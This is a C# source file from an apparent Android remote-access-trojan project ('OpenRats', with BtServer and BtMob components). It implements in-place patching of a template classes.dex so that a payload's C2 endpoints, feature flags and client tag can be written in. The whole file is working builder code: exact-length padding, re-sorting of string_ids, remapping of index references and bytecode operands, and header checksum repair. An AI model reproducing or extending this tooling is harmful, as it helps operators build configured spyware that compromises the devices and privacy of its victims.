// DexStringPatcher — in-place string-literal patching in a classes.dex.
//
// WHY THIS EXISTS
// ---------------
// The payload is configured by overwriting three literals in the DEX string
// table (C2 endpoints, feature flags, client tag). Three invariants must hold or
// ART refuses to load classes.dex:
//
//  (1) EXACT LENGTH / CONTIGUITY
//      A string_data_item is [uleb128 utf16_size][MUTF-8][0x00] and these DEXes
//      pack items with no slack. Writing a shorter replacement and NUL-filling
//      the rest leaves dead bytes between items and the verifier desyncs:
//
//        Failure to verify dex file 'base.apk':
//          Non-zero padding 13 before section of type 4097 at offset 0x1e2c55
//
//      So the replacement is padded to EXACTLY the original string's length; the
//      slot keeps an identical byte range and utf16_size width.
//
//  (2) string_ids MUST STAY SORTED
//      The format requires string_ids ordered by UTF-16 code unit value, and ART
//      enforces it ("Out-of-order string_ids: 'x' then 'y'"). A replacement that
//      sorts outside its slot's neighbourhood must be rotated to its correct
//      index.
//
//  (3) ROTATING string_ids SHIFTS INDICES, SO REFERENCES MUST BE REMAPPED
//      Other structures reference strings BY INDEX. A rotation moves a
//      contiguous index range, so every reference inside it shifts by one.
//      Miss one and loading fails ("Invalid field name: ...") or the app throws
//      at runtime. Remapped here: type_ids.descriptor_idx,
//      proto_ids.shorty_idx, field_ids/method_ids.name_idx,
//      class_defs.source_file_idx, and const-string / const-string/jumbo
//      operands in every method body.
//
// All three were established empirically on an API 36 emulator: same-length but
// unsorted crashed, sorted but shorter crashed, and a sorted exact-length
// replacement needed (3) to load.
//
// Shared verbatim by BtServer (net8.0) and BtMob (net462).

using System;
using System.Collections.Generic;
using System.Text;

namespace OpenRats;

public static class DexStringPatcher
{
	private const uint HeaderStringIdsSize = 56;
	private const uint HeaderStringIdsOff = 60;
	private const uint HeaderMapOff = 52;

	private const ushort TypeTypeId = 0x0002;
	private const ushort TypeProtoId = 0x0003;
	private const ushort TypeFieldId = 0x0004;
	private const ushort TypeMethodId = 0x0005;
	private const ushort TypeClassDef = 0x0006;

	/// <summary>Pad character used to reach the original string's exact length.</summary>
	public const char PadChar = ' ';

	/// <summary>
	/// Replace the DEX string literal <paramref name="original"/> with
	/// <paramref name="replacement"/>, preserving the slot's exact byte range and
	/// the string_ids sort order (remapping references when it must rotate).
	/// </summary>
	public static void Replace(byte[] dex, string original, string replacement, string what)
	{
		if (dex == null || dex.Length < 112) throw new ArgumentException("not a DEX", nameof(dex));

		uint stringIdsSize = ReadU32(dex, HeaderStringIdsSize);
		uint stringIdsOff = ReadU32(dex, HeaderStringIdsOff);
		if (stringIdsOff == 0 || stringIdsSize == 0)
			throw new InvalidOperationException("DEX has no string table");

		// Exact match preferred; prefix match as fallback (the real template C2
		// literal carries a trailing "|" the constant omits).
		int exact = -1, prefix = -1;
		for (uint i = 0; i < stringIdsSize; i++)
		{
			string v = ReadStringAt(dex, ReadU32(dex, stringIdsOff + i * 4));
			if (v == null) continue;
			if (v == original) { exact = (int)i; break; }
			if (prefix < 0 && v.StartsWith(original, StringComparison.Ordinal)) prefix = (int)i;
		}
		int index = exact >= 0 ? exact : prefix;
		if (index < 0)
			throw new InvalidOperationException("template DEX does not contain the " + what + " literal: " + original);

		uint dataOff = ReadU32(dex, stringIdsOff + (uint)index * 4);
		int consumed;
		uint origLen = ReadUleb(dex, (int)dataOff, out consumed);
		int dataStart = (int)dataOff + consumed;
		int dataEnd = dataStart;
		while (dataEnd < dex.Length && dex[dataEnd] != 0) dataEnd++;
		int utf8Len = dataEnd - dataStart;

		if (origLen != (uint)utf8Len)
			throw new InvalidOperationException(
				$"{what}: slot is not ASCII (utf16_size={origLen}, bytes={utf8Len}); not supported");

		int slotLen = (int)origLen;
		if (replacement.Length > slotLen)
			throw new InvalidOperationException(
				$"{what}: replacement needs {replacement.Length} chars but the DEX slot holds {slotLen}; " +
				"shorten the connection key, host list or tag");

		// (1) pad to the exact length so the item keeps its byte range
		string padded = replacement.PadRight(slotLen, PadChar);
		byte[] newData = Encoding.UTF8.GetBytes(padded);
		if (newData.Length != slotLen)
			throw new InvalidOperationException($"{what}: padding produced {newData.Length} bytes, expected {slotLen}");

		byte[] newUleb = EncodeUleb128((uint)slotLen);
		if (newUleb.Length != consumed)
			throw new InvalidOperationException($"{what}: utf16_size width changed ({consumed} -> {newUleb.Length})");

		Array.Copy(newUleb, 0, dex, (int)dataOff, newUleb.Length);
		Array.Copy(newData, 0, dex, dataStart, newData.Length);
		dex[dataEnd] = 0;

		// (2)+(3) restore ordering, remapping references if the entry moves
		RestoreSortedness(dex, stringIdsOff, stringIdsSize, index, padded);
	}

	/// <summary>
	/// Bubble the patched entry to its correct sorted index and remap references.
	/// The table was sorted before the patch and one element changed, so bubbling
	/// that element is sufficient and robust.
	/// </summary>
	private static void RestoreSortedness(byte[] dex, uint stringIdsOff, uint count, int from, string value)
	{
		int i = from;
		while (i > 0 && CompareAt(dex, stringIdsOff, i - 1, i) > 0)
		{
			SwapOffsets(dex, stringIdsOff, i - 1, i);
			RemapStringReferences(dex, i - 1, i, +1);
			i--;
		}
		while (i < (int)count - 1 && CompareAt(dex, stringIdsOff, i, i + 1) > 0)
		{
			SwapOffsets(dex, stringIdsOff, i, i + 1);
			RemapStringReferences(dex, i, i + 1, -1);
			i++;
		}
	}

	/// <summary>
	/// A rotation step swapped indices <paramref name="a"/> and <paramref name="b"/>
	/// (a &lt; b). References that pointed at <paramref name="a"/> must now point at
	/// b, and everything strictly between shifts by <paramref name="delta"/>.
	/// </summary>
	private static void RemapStringReferences(byte[] dex, int a, int b, int delta)
	{
		// A single swap is a special case of "shift the range [a,b) by delta, and
		// the value that left index a now lives at b".
		uint mapOff = ReadU32(dex, HeaderMapOff);
		if (mapOff == 0 || mapOff + 4 > dex.Length) return;
		uint mapSize = ReadU32(dex, mapOff);

		for (uint e = 0; e < mapSize; e++)
		{
			uint p = mapOff + 4 + e * 12;
			if (p + 12 > dex.Length) break;
			ushort type = ReadU16(dex, p);
			uint size = ReadU32(dex, p + 4), off = ReadU32(dex, p + 8);

			switch (type)
			{
				case TypeTypeId: RemapStride(dex, off, size, 4, 0, 4, a, b, delta); break;
				case TypeProtoId: RemapStride(dex, off, size, 12, 0, 4, a, b, delta); break;
				case TypeFieldId:
				case TypeMethodId: RemapStride(dex, off, size, 8, 4, 4, a, b, delta); break;
				case TypeClassDef: RemapStride(dex, off, size, 32, 16, 4, a, b, delta); break;
			}
		}

		RemapConstStrings(dex, a, b, delta);
	}

	private static void RemapStride(byte[] dex, uint off, uint count, int stride, int fieldOff,
		int width, int a, int b, int delta)
	{
		for (uint i = 0; i < count; i++)
		{
			int at = (int)off + (int)i * stride + fieldOff;
			if (at + width > dex.Length) return;
			uint v = width == 4 ? ReadU32(dex, (uint)at) : ReadU16(dex, (uint)at);
			if (v == 0xFFFFFFFFu) continue;
			int nv = Remap((int)v, a, b, delta);
			if (nv != (int)v) WriteAt(dex, at, nv, width);
		}
	}

	private static void RemapConstStrings(byte[] dex, int a, int b, int delta)
	{
		foreach (int codeOff in EnumerateCodeItems(dex))
		{
			uint insnsSize = ReadU32(dex, (uint)codeOff + 12);
			int insns = codeOff + 16;
			if (insnsSize == 0 || insns + (long)insnsSize * 2 > dex.Length) continue;

			int k = 0;
			while (k < insnsSize)
			{
				int unitOff = insns + k * 2;
				int op = dex[unitOff];
				if (op == 0x1A && k + 1 < insnsSize)
				{
					int idx = ReadU16(dex, (uint)(unitOff + 2));
					int nv = Remap(idx, a, b, delta);
					if (nv != idx) WriteAt(dex, unitOff + 2, nv, 2);
				}
				else if (op == 0x1B && k + 2 < insnsSize)
				{
					int idx = ReadU16(dex, (uint)(unitOff + 2)) | (ReadU16(dex, (uint)(unitOff + 4)) << 16);
					int nv = Remap(idx, a, b, delta);
					if (nv != idx) WriteAt(dex, unitOff + 2, nv & 0xFFFF, 2);
					if (nv != idx) WriteAt(dex, unitOff + 4, (nv >> 16) & 0xFFFF, 2);
				}
				k += Math.Max(1, InstructionLength(op));
			}
		}
	}

	/// <summary>
	/// Map an old string index through one swap of neighbours a and b (a &lt; b).
	/// Both indices change meaning, so both directions must be mapped:
	/// a -&gt; b (the patched value moved right) and b -&gt; a (whatever moved left).
	/// For a longer rotation the entries strictly between shift by
	/// <paramref name="delta"/>.
	/// </summary>
	private static int Remap(int v, int a, int b, int delta)
	{
		if (v == a) return b;
		if (v == b) return a;
		if (v > a && v < b) return v + delta;
		return v;
	}

	private static int CompareAt(byte[] dex, uint stringIdsOff, int x, int y)
	{
		string vx = ReadStringAt(dex, ReadU32(dex, stringIdsOff + (uint)x * 4));
		string vy = ReadStringAt(dex, ReadU32(dex, stringIdsOff + (uint)y * 4));
		if (vx == null || vy == null) return 0;
		return string.CompareOrdinal(vx, vy);
	}

	private static void SwapOffsets(byte[] dex, uint stringIdsOff, int x, int y)
	{
		int px = (int)stringIdsOff + x * 4;
		int py = (int)stringIdsOff + y * 4;
		uint vx = ReadU32(dex, (uint)px);
		uint vy = ReadU32(dex, (uint)py);
		WriteU32(dex, px, vy);
		WriteU32(dex, py, vx);
	}

	// ------------------------------------------------------------------
	// code_item walking
	// ------------------------------------------------------------------

	private static IEnumerable<int> EnumerateCodeItems(byte[] dex)
	{
		var seen = new HashSet<int>();
		uint mapOff = ReadU32(dex, HeaderMapOff);
		if (mapOff == 0 || mapOff + 4 > dex.Length) yield break;
		uint mapSize = ReadU32(dex, mapOff);

		for (uint e = 0; e < mapSize; e++)
		{
			uint p = mapOff + 4 + e * 12;
			if (p + 12 > dex.Length) break;
			if (ReadU16(dex, p) != TypeClassDef) continue;
			uint count = ReadU32(dex, p + 4), off = ReadU32(dex, p + 8);

			for (uint i = 0; i < count; i++)
			{
				uint cd = off + i * 32;
				if (cd + 32 > dex.Length) break;
				uint classDataOff = ReadU32(dex, cd + 24);
				if (classDataOff == 0 || classDataOff >= dex.Length) continue;

				int q = (int)classDataOff;
				int staticFields = (int)ReadUlebAt(dex, ref q);
				int instanceFields = (int)ReadUlebAt(dex, ref q);
				int directMethods = (int)ReadUlebAt(dex, ref q);
				int virtualMethods = (int)ReadUlebAt(dex, ref q);

				for (int f = 0; f < staticFields + instanceFields; f++)
				{
					ReadUlebAt(dex, ref q);
					ReadUlebAt(dex, ref q);
				}
				for (int m = 0; m < directMethods + virtualMethods; m++)
				{
					ReadUlebAt(dex, ref q);
					ReadUlebAt(dex, ref q);
					int codeOff = (int)ReadUlebAt(dex, ref q);
					if (codeOff != 0 && codeOff + 16 <= dex.Length && seen.Add(codeOff))
						yield return codeOff;
				}
			}
		}
	}

	/// <summary>16-bit code units per opcode (Dalvik spec table).</summary>
	private static int InstructionLength(int op)
	{
		if (op == 0x00) return 1;                       // nop / payload (payloads are even-aligned)
		if (op <= 0x09) return op == 0x02 || op == 0x05 || op == 0x08 ? 2 : (op == 0x03 || op == 0x06 || op == 0x09 ? 3 : 1);
		if (op <= 0x1B) return op switch
		{
			0x13 or 0x15 or 0x16 or 0x19 or 0x1A or 0x1C => 2,
			0x14 or 0x17 or 0x1B => 3,
			0x18 => 5,
			_ => 1
		};
		if (op <= 0x26) return op switch
		{
			0x1F or 0x20 or 0x22 or 0x23 => 2,
			0x24 or 0x25 or 0x26 => 3,
			_ => 1
		};
		if (op <= 0x2C) return op == 0x28 ? 1 : (op == 0x2B || op == 0x2C ? 3 : 2);
		if (op <= 0x31) return 2;
		if (op <= 0x43) return 2;
		if (op <= 0x51) return 2;
		if (op <= 0x5F) return 2;
		if (op <= 0x6D) return 2;
		if (op <= 0x72) return 3;
		if (op <= 0x78) return 3;
		if (op <= 0x8F) return 1;
		if (op <= 0xAF) return 1;
		if (op <= 0xCF) return 1;
		if (op <= 0xD7) return 2;
		if (op <= 0xE2) return 2;
		if (op <= 0xFA) return 1;
		if (op <= 0xFB) return 4;
		if (op <= 0xFD) return 3;
		return 2;
	}

	// ------------------------------------------------------------------
	// primitives
	// ------------------------------------------------------------------

	private static string ReadStringAt(byte[] dex, uint dataOff)
	{
		int at = (int)dataOff;
		if (at < 0 || at >= dex.Length) return null;
		int consumed;
		ReadUleb(dex, at, out consumed);
		int start = at + consumed;
		if (start > dex.Length) return null;
		int end = start;
		while (end < dex.Length && dex[end] != 0) end++;
		try { return Encoding.UTF8.GetString(dex, start, end - start); }
		catch { return null; }
	}

	private static uint ReadUlebAt(byte[] b, ref int p)
	{
		uint result = 0; int shift = 0;
		while (p < b.Length)
		{
			byte cur = b[p++];
			result |= (uint)(cur & 0x7F) << shift;
			if ((cur & 0x80) == 0) break;
			shift += 7;
			if (shift > 28) break;
		}
		return result;
	}

	private static uint ReadUleb(byte[] b, int at, out int consumed)
	{
		uint result = 0; int shift = 0; consumed = 0;
		while (consumed < 5 && at + consumed < b.Length)
		{
			byte cur = b[at + consumed];
			result |= (uint)(cur & 0x7F) << shift;
			consumed++;
			if ((cur & 0x80) == 0) break;
			shift += 7;
		}
		return result;
	}

	private static byte[] EncodeUleb128(uint value)
	{
		var tmp = new byte[5];
		int n = 0;
		do
		{
			byte b = (byte)(value & 0x7F);
			value >>= 7;
			if (value != 0) b |= 0x80;
			tmp[n++] = b;
		} while (value != 0);
		var result = new byte[n];
		Array.Copy(tmp, result, n);
		return result;
	}

	private static void WriteAt(byte[] dex, int at, int v, int width)
	{
		dex[at] = (byte)v;
		dex[at + 1] = (byte)(v >> 8);
		if (width == 4)
		{
			dex[at + 2] = (byte)(v >> 16);
			dex[at + 3] = (byte)(v >> 24);
		}
	}

	private static ushort ReadU16(byte[] b, uint off)
	{
		int o = (int)off;
		return (ushort)(b[o] | (b[o + 1] << 8));
	}

	private static uint ReadU32(byte[] b, uint off)
	{
		int o = (int)off;
		if (o + 4 > b.Length) throw new InvalidOperationException("DEX offset out of range: " + off);
		return (uint)(b[o] | (b[o + 1] << 8) | (b[o + 2] << 16) | (b[o + 3] << 24));
	}

	private static void WriteU32(byte[] b, int off, uint v)
	{
		b[off] = (byte)v;
		b[off + 1] = (byte)(v >> 8);
		b[off + 2] = (byte)(v >> 16);
		b[off + 3] = (byte)(v >> 24);
	}

	/// <summary>Recompute the DEX header SHA-1 signature and adler32 checksum.</summary>
	public static void FixHeader(byte[] dex)
	{
		using (var sha = System.Security.Cryptography.SHA1.Create())
		{
			Array.Clear(dex, 12, 20);
			byte[] sig = sha.ComputeHash(dex, 32, dex.Length - 32);
			Array.Copy(sig, 0, dex, 12, 20);
		}
		uint a = 1, b = 0;
		for (int i = 12; i < dex.Length; i++)
		{
			a = (a + dex[i]) % 65521;
			b = (b + a) % 65521;
		}
		uint sum = (b << 16) | a;
		dex[8] = (byte)sum;
		dex[9] = (byte)(sum >> 8);
		dex[10] = (byte)(sum >> 16);
		dex[11] = (byte)(sum >> 24);
	}
}
